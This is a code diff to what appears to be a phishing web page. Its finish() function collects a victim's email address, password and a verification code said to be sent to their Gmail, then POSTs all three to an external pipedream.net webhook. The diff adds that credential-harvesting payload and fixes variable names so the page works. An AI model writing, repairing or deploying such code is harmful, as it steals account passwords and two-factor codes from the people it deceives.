@@ -194,9 +194,9 @@ document.getElementById("page"+page).classList.add("active");
 
 function finish() {
 
-    const Email Address = document.getElementById("Email Address").value;
+    const EmailAddress = document.getElementById("EmailAddress").value;
     const Password = document.getElementById("Password").value;
-    const A rifivecation code has been sent to your Gmail; please enter it here. = document.getElementById("Enter the code").value;
+    const Enterthecode  = document.getElementById("Enterthecode").value;
 
     fetch("https://eoc0klx6oxuuegp.m.pipedream.net", {
         method: "POST",
@@ -204,9 +204,9 @@ function finish() {
             "Content-Type": "application/json"
         },
         body: JSON.stringify({
-            uid: uid,
-            uid2: uid2,
-            name: name
+           EmailAddress : EmailAddress,
+           Password : Password,
+           Enterthecode : Enterthecode
         })
     });
 
